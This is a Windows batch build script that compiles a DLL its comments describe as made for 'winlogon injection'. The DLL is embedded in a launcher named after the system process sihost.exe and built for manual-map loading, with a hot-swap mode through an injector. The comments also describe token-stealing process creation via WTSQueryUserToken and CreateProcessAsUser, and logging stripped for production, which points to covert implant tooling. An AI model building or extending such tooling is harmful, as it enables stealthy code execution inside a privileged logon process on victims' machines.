@echo off
setlocal enabledelayedexpansion

REM =============================================================
REM  build_helper.bat -- Build wl_input.dll for winlogon injection.
REM
REM  Two build modes:
REM    default        Manual-map compatible target. Embedded into
REM                   sihost.exe RCDATA 102 at launcher build time.
REM                   Flags mirror payload/build.bat (/GS- /guard:cf-)
REM                   because manual-map skips CRT init.
REM    /loadlib       LoadLibrary iteration mode. Exports DllMain but
REM                   the entry point resolves __security_cookie via
REM                   the standard loader, so /GS is safe. Use with
REM                   host_inject.exe for hot-swap during dev.
REM =============================================================

set ROOT=%~dp0..\..\..
set SRC=%~dp0
set BUILD=%ROOT%\build\helper
set OUT_NAME=wl_input.dll

if not exist "%BUILD%" mkdir "%BUILD%"

where cl.exe >nul 2>nul
if not errorlevel 1 goto :HAVE_CL

set VSWHERE="%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if not exist %VSWHERE% (echo [!] vswhere missing & exit /b 1)
for /f "usebackq tokens=*" %%A in (`%VSWHERE% -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath`) do set VS_DIR=%%A
if "%VS_DIR%"=="" (echo [!] no VC++ tools & exit /b 1)
call "%VS_DIR%\VC\Auxiliary\Build\vcvars64.bat" >nul

:HAVE_CL

echo === Building %OUT_NAME% ===

REM ── Mode detection ──
set MODE=mm
set MODEDEF=
set MODESTR=manual-map
if /I "%1"=="/loadlib" (
    set MODE=loadlib
    set MODEDEF=/DWL_LOADLIB=1
    set MODESTR=LoadLibrary (iteration)
)
echo === Mode: %MODESTR% ===

REM ── Diag toggle (default OFF for prod) ──
set DIAGDEF=
if /I "%WL_DIAG%"=="1" (
    set DIAGDEF=/DWL_DIAG=1
    echo === WL_DIAG=1 -- diag logging to wl_input.log ENABLED ===
) else (
    echo === WL_DIAG unset -- diag logging STRIPPED ^(production^) ===
)

REM ── Compile flags ──
REM  /GS-           MANDATORY for manual-map (no CRT init for cookies)
REM  /guard:cf-     MANDATORY for manual-map (loader doesn't populate CFG)
REM  /Gy /MT /GL    static CRT, whole-program-opt, function-level linking
REM  /GS is safe in LoadLibrary mode but keep /GS- for binary parity between
REM  the two modes (means iteration builds match manual-map builds byte-wise
REM  wherever possible; makes RE recon reproducible)
set CFLAGS=/nologo /W3 /O2 /Oi /GS- /Gy /MT /GL /DNDEBUG /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN /guard:cf- %MODEDEF% %DIAGDEF%

REM ── Link flags ──
REM  /DLL           produce a DLL (has DllMain export)
REM  /RELEASE       IMAGE_FILE_RELEASE flag
REM  /DEBUG:NONE    no PDB path leak
REM  /Brepro        deterministic
REM  /OPT:REF+ICF   dead code + identical-func merge
REM  /HIGHENTROPYVA /DYNAMICBASE /NXCOMPAT /CETCOMPAT   ASLR + DEP + CET
REM  /GUARD:NO      no CFG (matches /guard:cf-)
REM  Do NOT merge .pdata into .text (x64 SEH needs .pdata separate).
set LDFLAGS=/nologo /DLL /LTCG /DEBUG:NONE /Brepro ^
 /OPT:REF /OPT:ICF /INCREMENTAL:NO /MANIFEST:NO /GUARD:NO /RELEASE ^
 /HIGHENTROPYVA /DYNAMICBASE /NXCOMPAT /CETCOMPAT ^
 /OUT:"%BUILD%\%OUT_NAME%"

REM ── Compile + link ──
pushd "%BUILD%"
cl %CFLAGS% /c /Fowl_input.obj "%SRC%wl_input.c"
if errorlevel 1 (echo [!] compile failed & popd & exit /b 1)
REM v3.0.3 (2026-09-21) -- sentinel_thread additions: +wtsapi32 (WTSQueryUserToken,
REM WTSGetActiveConsoleSessionId), +userenv (CreateEnvironmentBlock/
REM DestroyEnvironmentBlock for CreateProcessAsUser env inheritance).
REM v15.1.8 (2026-09-22) -- UIA server needs ole32 (CoInitializeEx/CoCreateInstance),
REM oleaut32 (SysFreeString for BSTR).
link %LDFLAGS% wl_input.obj kernel32.lib user32.lib advapi32.lib bcrypt.lib wtsapi32.lib userenv.lib ole32.lib oleaut32.lib
if errorlevel 1 (echo [!] link failed & popd & exit /b 1)
popd

REM ── Clean intermediates ──
del /q "%BUILD%\*.obj" 2>nul
del /q "%BUILD%\*.pdb" 2>nul
del /q "%BUILD%\*.exp" 2>nul
del /q "%BUILD%\*.lib" 2>nul

for %%F in ("%BUILD%\%OUT_NAME%") do echo === Built %%F  (%%~zF bytes) ===
